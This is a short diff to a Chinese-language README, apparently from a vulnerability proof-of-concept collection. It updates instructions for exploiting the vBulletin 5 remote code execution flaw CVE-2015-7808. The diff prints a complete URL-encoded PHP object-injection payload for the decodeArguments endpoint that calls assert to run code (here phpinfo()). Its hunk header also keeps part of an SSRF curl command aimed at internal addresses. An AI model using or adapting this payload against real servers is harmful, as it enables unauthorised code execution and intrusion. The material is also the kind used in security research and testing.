@@ -46,7 +46,6 @@ curl -d "url=http://172.17.0.1:80/hello_ssrf" "http://172.17.0.2/link/getlinkdat
 
 Poc
 
-使用`vBulletin5全版本远程代码执行漏洞`目录下的 `exp.php`生成payload，作为数参数访问：
+使用`CVE-2015-7808`目录下的`exp.php`脚本生成payload，将payload作为`arguments`数参数访问url：
 
 `http://127.0.0.1/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D`
-
